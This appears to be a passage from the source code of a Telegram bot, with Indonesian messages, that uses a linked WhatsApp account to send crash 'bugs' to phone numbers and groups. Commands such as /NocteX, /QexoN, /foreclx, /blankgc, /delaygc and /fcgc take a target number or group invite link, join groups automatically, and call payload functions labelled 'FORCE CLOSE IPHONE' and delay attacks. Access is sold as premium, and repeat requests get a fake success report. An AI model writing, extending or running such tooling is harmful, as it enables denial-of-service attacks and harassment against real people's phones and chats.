            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
        // ❌ error lain silent
      })
      .finally(() => {
        processingTargetsB.delete(target);
        targetCycleCountB.delete(target);

        if (notifiedConnectionClosedB.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsC = new Set();
const targetCycleCountC = new Map();
const connectionFailCountC = new Map();
const notifiedConnectionClosedC = new Set(); // global
let senderDeadNotifiedC = false;

bot.onText(/\/NocteX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /NocteX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /NocteX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5888806062995282044", // 🙂
    };

    const e1 = prem("6010096364636085882", "🎁");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedC = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/noctex")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /noctex.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountC.get(target) || 0;
    targetCycleCountC.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE IPHONE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose Iphone
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsC.has(target)) return;
    processingTargetsC.add(target);

    // ===== LOG CLEAN =====
    console.log(`\x1b[36m[PROSES SEND BUG]\x1b[0m -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp8(target)
      .then(() => {
        connectionFailCountC.delete(target);
        notifiedConnectionClosedC.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountC.get(target) || 0;
          fail++;
          connectionFailCountC.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedC.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
        // ❌ error lain silent
      })
      .finally(() => {
        processingTargetsC.delete(target);
        targetCycleCountC.delete(target);

        // ===== GLOBAL NOTIF =====
        if (notifiedConnectionClosedC.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsQ = new Set();
const targetCycleCountQ = new Map();
const connectionFailCountQ = new Map();
const notifiedConnectionClosedQ = new Set(); // global
let senderDeadNotifiedQ = false;

bot.onText(/\/QexoN(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /QexoN 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚂𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /QexoN 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5890876692498488000", // ❤️
    };

    const e1 = prem("5424942942122964312", "🧢");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedQ = false;
    
    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/qexon")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /qexon.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

   // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!

🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.

✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountQ.get(target) || 0;
    targetCycleCountQ.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE IPHONE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose Iphone
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "primary",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsQ.has(target)) return;
    processingTargetsQ.add(target);

    // ===== LOG CLEAN =====
    console.log(`\x1b[36m[PROSES SEND BUG]\x1b[0m -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp9(target)
      .then(() => {
        connectionFailCountQ.delete(target);
        notifiedConnectionClosedQ.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountQ.get(target) || 0;
          fail++;
          connectionFailCountQ.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedQ.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
        // ❌ error lain silent
      })
      .finally(() => {
        processingTargetsQ.delete(target);
        targetCycleCountQ.delete(target);

        // ===== GLOBAL NOTIF =====
        if (notifiedConnectionClosedQ.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});

// ===== BOT COMMAND =====
const processingTargetsForclose = new Set();
const connectionFailCountForclose = new Map();
const targetCycleCountForclose = new Map();
const notifiedConnectionClosedForclose = new Set(); // global
let senderDeadNotifiedForclose = false;

bot.onText(/\/foreclx(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /foreclx 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "𝙵𝚘𝚛𝚖𝚊𝚝 𝚜𝚊𝚕𝚊𝚑, 𝚌𝚘𝚗𝚝𝚘𝚑: /foreclx 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5992173732397848888",
    };

    const e1 = prem("6100553439656284469", "😌");

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    senderDeadNotifiedForclose = false;

    const isPremium = premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/foreclx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /foreclx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!
𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `𝙹𝙾𝙸𝙽 𝙺𝙰𝙺 #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ 𝚅𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 𝙰𝙺𝚂𝙴𝚂 𝚃𝙴𝚁𝙱𝙰𝚃𝙰𝚂!
🔒 𝙺𝚊𝚖𝚞 𝚠𝚊𝚓𝚒𝚋 𝚓𝚘𝚒𝚗 𝚜𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 𝚝𝚎𝚛𝚕𝚎𝚋𝚒𝚑 𝚍𝚊𝚑𝚞𝚕𝚞.
✨ 𝚂𝚎𝚝𝚎𝚕𝚊𝚑 𝚓𝚘𝚒𝚗, 𝚝𝚎𝚔𝚊𝚗 𝚝𝚘𝚖𝚋𝚘𝚕 𝚟𝚎𝚛𝚒𝚏𝚒𝚔𝚊𝚜𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    let count = targetCycleCountForclose.get(target) || 0;
    targetCycleCountForclose.set(target, count + 1);
    const isRealSend = count < 3;

    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE × DELAY</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose X Delay
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝚃𝙰𝚁𝙶𝙴𝚃",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    if (!isRealSend) return;

    if (processingTargetsForclose.has(target)) return;
    processingTargetsForclose.add(target);

    await raraaimupp10(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountForclose.get(target) || 0;
          fail++;
          connectionFailCountForclose.set(target, fail);

          if (fail >= 2) {
            notifiedConnectionClosedForclose.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsForclose.delete(target);
        targetCycleCountForclose.delete(target);

        if (notifiedConnectionClosedForclose.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});

// # CASE BUG GROUP SCARRY DEATH # \\
bot.onText(/\/blankgc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /blankgc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
const groupSendTracker = new Map();

bot.onText(/\/blankgc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");

  
  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (!isCmdActive("/blankgc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /blankgc.");
}
  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /blankgc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
        err.includes("already") ||
        err.includes("member") ||
        err.includes("exists")
      ) {
        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} TYPE BEBAS SPAM GROUP

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Bugs
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝙶𝚁𝙾𝚄𝙿",
              url: rawParam,
              style: "success",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa1(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/delaygc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /delaygc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
bot.onText(/\/delaygc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isCmdActive("/delaygc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /delaygc.");
}
  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /delaygc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
        err.includes("already") ||
        err.includes("member") ||
        err.includes("exists")
      ) {
        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} TYPE BEBAS SPAM GROUP

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Bugs
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝙶𝚁𝙾𝚄𝙿",
              url: rawParam,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

    if (isRealSend) {
      murbugraa2(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

bot.onText(/\/fcgc$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /fcgc https://chat.whatsapp.com/xxxx");
});
// TAMBAHAN TRACK (GLOBAL)
bot.onText(/\/fcgc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const chatType = msg.chat.type;
  const isPremium = premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "𝚃𝚒𝚍𝚊𝚔 𝚊𝚍𝚊 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎";

  // 🔥 EMOJI PREMIUM
  const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
  const EMOJI = {
    main: "5979037639347542903",   // 👻
    btn: "4935965077296645149"     // 😨
  };
  const e1 = prem(EMOJI.main, "👻");

  const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

  if (!isCmdActive("/fcgc")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /fcgc.");
}
  if (!isPremium && !groupAllowed) {
    return bot.sendMessage(chatId,
      "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
    );
  }

  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /fcgc https://chat.whatsapp.com/xxxx");
  }

  try {

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    const otax = sock;

    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await otax.groupAcceptInvite(groupCode);
    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        return bot.sendMessage(chatId,
`❌ Gagal masuk grup!

Penyebab:
Grup PRIVATE / perlu approval admin.`);
      }

      if (
        err.includes("already") ||
        err.includes("member") ||
        err.includes("exists")
      ) {
        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            return bot.sendMessage(chatId, `❌ Link expired / tidak valid.`);
          }

          groupJid = inviteInfo.id;

        } catch {
          return bot.sendMessage(chatId, `❌ Gagal ambil info grup.`);
        }
      } else {
        return bot.sendMessage(chatId, `❌ Gagal join grup: ${e?.message || "Unknown error"}`);
      }
    }

    if (!groupJid || !groupJid.includes("@g.us")) {
      return bot.sendMessage(chatId, `❌ groupJid tidak valid.`);
    }

    // 🔥 FORMAT (KIRIM DULU)
    const userMention = mentionUserHTML(msg);
    const formattedNumber = rawParam;

    const messageText = `
<blockquote>
${e1} TYPE BEBAS SPAM GROUP

${a1} User : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
${a3} Status : Success Send Bugs
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙲𝙷𝙴𝙲𝙺 𝙶𝚁𝙾𝚄𝙿",
              url: rawParam,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btn
            }
          ]
        ]
      }
    });

    // 🔥 PROSES DI BELAKANG (SILENT)
    let count = groupSendTracker.get(groupJid) || 0;
    count++;
    groupSendTracker.set(groupJid, count);

    const isRealSend = count <= 2;

